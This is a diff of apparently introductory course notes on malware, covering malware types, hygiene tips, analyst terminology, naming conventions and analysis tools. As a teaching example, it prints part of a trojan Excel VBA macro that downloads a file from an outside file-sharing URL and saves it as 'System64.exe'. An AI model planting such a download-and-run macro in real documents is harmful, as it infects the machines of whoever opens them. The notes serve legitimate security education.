@@ -1,8 +1,9 @@
-### Week 1
+## Week 1
 
+### Introduction
 The first lecture serves as an introduction to malware, a catch-all term for unwanted software running on a device. Malware includes software running on your machine as malicious as ransomware (software that encrypts the contents of your computer for the purposes of extorting you) to something more benign but annoying like adware (software which bombards the user with ads and pop-ups). Malware is primarily used for financial gain, information gathering, and/or as a method to attack companies or users. It can be employed by nearly anyone with access to the internet and some simple computer know-how, like criminal organizations, lone agents, or government entities. The need to prevent or resolve the issues caused by malware have led to the creation of companies and organizations devoted to anti-malware.
 
-
+### Anti-Malware
 Anti-malware groups have developed methodologies for the purposes of detection, prevention, and, in some cases, destruction of malware. To deal with a malware threat, it is necessary to understand and categorize malware. There are commonly a few types of malware and they tend to fall into the following categories:
 1. Virus - characterized by a pattern of spreading
 2. Trojans - characterized by method of entry onto a user's machine.
@@ -15,6 +16,7 @@ Although the prospect of viruses and trojans might be worrisome, it has been det
 3. Don't use random USB sticks.
 4. Don't access programs or mobile apps from unverifiable authors.
 
+### Malware
 As an example, a trojan could have been hidden inside of a macro run as a result of opening an Excel file. It may have looked like this:
 ```
 Sub DoWork()
@@ -28,7 +30,8 @@ tmp = DownloadFile("http://ge.tt/api/1/files/8e8kZt72/0/blob?download")
 fName = "System64.exe
 ```
 
-The security community has also devised a few terms in their work with malware. This includes the following:
+### Terminology
+The security community has also devised a few terms in their work with malware. This includes, but is not limited to, the following:
 1. white - a known clean file
 2. black - a known dirty file
 3. gray - a file which has neither been confirmed clean or dirty
@@ -40,5 +43,14 @@ The security community has also devised a few terms in their work with malware. 
 9. dropper - the file that is used by a trojan
 
 
-These are just some of the terms that are used.
+### Practices
+Standards in naming are used to categorize malware. A particular convention is to categorize by type (virus, trojan, etc.), then platform (linux, win32, etc.), then family of malware (malware that displays similar behavior, imphash, etc.), then a variant name using letters as a designation. This naming convention allows anti-malware software and professionals to quickly understand its high level characteristics (how does it spread, what does it do). 
 
+
+Handling malware requires special considerations. (1.4.5:58)
+
+### Useful Tools
+- Virustotal - a site where users can upload an md5 hash/file/url to search against a database maintained by many vendors to determine the type of malware they're dealing with.
+- Malwr - a sample is provided to the site, an isolated environment evaluates the malware, and reports back behavior
+- Wepawet - used for analysis of obfuscated java, pdf, files for decryption.
+- Comodo - document analyzer.
